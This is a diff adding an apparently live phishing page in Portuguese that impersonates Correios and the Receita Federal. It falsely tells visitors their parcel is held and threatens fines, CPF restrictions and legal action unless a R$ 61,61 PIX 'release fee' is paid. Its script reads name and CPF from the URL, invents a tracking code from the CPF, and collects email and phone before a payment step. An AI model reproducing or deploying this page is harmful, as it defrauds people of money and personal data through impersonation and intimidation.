@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#003366">
+  <title>Pagamento | Correios</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814j">
+</head>
+<body>
+  <div class="page page-index5">
+    <header class="index5-top">
+      <img src="assets/img/logo-correios-header.png" alt="Correios" class="index5-logo" onerror="this.onerror=null;this.src='assets/img/logo-correios.svg';">
+      <div class="index5-user">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="#003366" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        <span>Olá, <strong id="primeiroNome">Cliente</strong></span>
+      </div>
+    </header>
+
+    <div class="index5-divider"></div>
+
+    <div class="index5-secure-bar">
+      <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#fff" d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-3 0H9V6a3 3 0 016 0v2z"/></svg>
+      PAGAMENTO 100% SEGURO
+      <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#fff" d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 13.17l-4.17-4.17 1.41-1.41L11 11.34l6.17-6.17 1.41 1.41L11 14.17z"/></svg>
+    </div>
+
+    <div class="index5-content">
+      <div class="index5-alert-box">
+        <p>
+          <strong>ATENÇÃO!</strong> Sua mercadoria foi <strong>RETIDA</strong> por falta de Nota Fiscal.
+          O não pagamento imediato da taxa de liberação no valor de <strong id="valorAlerta">R$ 61,61</strong>
+          resultará em uma multa de <strong>75%</strong> sobre o valor do produto, além de possíveis restrições
+          no seu CPF e ações legais conforme a regulamentação vigente.
+        </p>
+      </div>
+
+      <h1 class="index5-title">Objeto taxado pela unidade de fiscalização</h1>
+      <p class="index5-subtitle">Confirme os dados do destinatário para liberação da entrega.</p>
+
+      <form id="formPagamento" class="index5-form" action="pagamento/" method="GET">
+        <input type="hidden" name="nome" id="hidden-nome">
+        <input type="hidden" name="cpf" id="hidden-cpf">
+        <input type="hidden" name="codigo" id="hidden-codigo">
+
+        <div class="index5-field">
+          <label for="email">E-mail <span class="index5-required">*</span></label>
+          <input type="email" id="email" name="email" placeholder="seuemail@exemplo.com" required>
+        </div>
+
+        <div class="index5-field">
+          <label for="telefone">Telefone / WhatsApp <span class="index5-required">*</span></label>
+          <input type="tel" id="telefone" name="telefone" placeholder="(11) 99999-9999" required maxlength="15">
+        </div>
+
+        <button type="submit" class="index5-btn-pay" id="btnCheckout">PAGAR AGORA →</button>
+      </form>
+
+      <div class="index5-summary">
+        <div class="index5-summary-head">
+          <span>Resumo do pagamento</span>
+          <img src="assets/img/logo2.png" alt="Receita Federal" class="index5-rf-logo">
+        </div>
+
+        <div class="index5-summary-row">
+          <span class="index5-summary-label">Cód. de rastreio</span>
+          <span class="index5-summary-value index5-track-value">
+            <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#003366" d="M4 6h2v12H4V6zm4 0h2v12H8V6zm4 0h2v12h-2V6zm4 0h2v12h-2V6zm4 0h2v12h-2V6z"/></svg>
+            <span id="codigoRastreio">DA 000 000 000 BR</span>
+          </span>
+        </div>
+
+        <div class="index5-summary-row">
+          <span class="index5-summary-label">CPF</span>
+          <span class="index5-summary-value" id="resumo-cpf">000.000.000-00</span>
+        </div>
+
+        <div class="index5-summary-row index5-summary-total">
+          <span class="index5-summary-label">Total a pagar</span>
+          <span class="index5-summary-value" id="valorTotal">R$ 61,61</span>
+        </div>
+
+        <div class="index5-summary-foot">
+          <span>◆ Pagamento via PIX</span>
+          <span>🏛 Banco Central do Brasil</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const VALOR_FORMATADO = "R$ 61,61";
+      const params = new URLSearchParams(window.location.search);
+      const nome = params.get("nome") || "";
+      const cpf = params.get("cpf") || "";
+
+      if (!cpf || !nome) {
+        window.location.href = "consulta.html";
+        return;
+      }
+
+      const primeiroNome = nome.trim().split(/\s+/)[0] || "Cliente";
+      document.getElementById("primeiroNome").textContent =
+        primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+
+      function gerarCodigoRastreio(cpfValor) {
+        const digits = (cpfValor || "").replace(/\D/g, "");
+        const base = digits.slice(0, 9) || "795188047";
+        const num = String(100000000 + (parseInt(base, 10) % 900000000)).padStart(9, "0");
+        const parte = num.slice(0, 3) + " " + num.slice(3, 6) + " " + num.slice(6, 9);
+        return "DA " + parte + " BR";
+      }
+
+      function gerarCodigoRastreioRaw(cpfValor) {
+        return gerarCodigoRastreio(cpfValor).replace(/\s/g, "");
+      }
+
+      document.getElementById("codigoRastreio").textContent = gerarCodigoRastreio(cpf);
+      document.getElementById("hidden-codigo").value = gerarCodigoRastreioRaw(cpf);
+      document.getElementById("resumo-cpf").textContent = cpf;
+      document.getElementById("valorAlerta").textContent = VALOR_FORMATADO;
+      document.getElementById("valorTotal").textContent = VALOR_FORMATADO;
+      document.getElementById("hidden-nome").value = nome;
+      document.getElementById("hidden-cpf").value = cpf;
+
+      const telInput = document.getElementById("telefone");
+      telInput.addEventListener("input", (e) => {
+        const x = e.target.value.replace(/\D/g, "").match(/(\d{0,2})(\d{0,5})(\d{0,4})/);
+        e.target.value = !x[2] ? x[1] : "(" + x[1] + ") " + x[2] + (x[3] ? "-" + x[3] : "");
+      });
+
+      document.getElementById("formPagamento").addEventListener("submit", (e) => {
+        if (window.RastreiooTracking && typeof window.RastreiooTracking.appendTrackingToForm === "function") {
+          window.RastreiooTracking.appendTrackingToForm(e.target);
+        }
+
+        const tel = telInput.value.replace(/\D/g, "");
+        if (tel.length < 10) {
+          e.preventDefault();
+          alert("Informe um telefone válido com DDD.");
+          telInput.focus();
+          return;
+        }
+        const btn = document.getElementById("btnCheckout");
+        btn.disabled = true;
+        btn.textContent = "PROCESSANDO...";
+      });
+    });
+  </script>
+</body>
+</html>
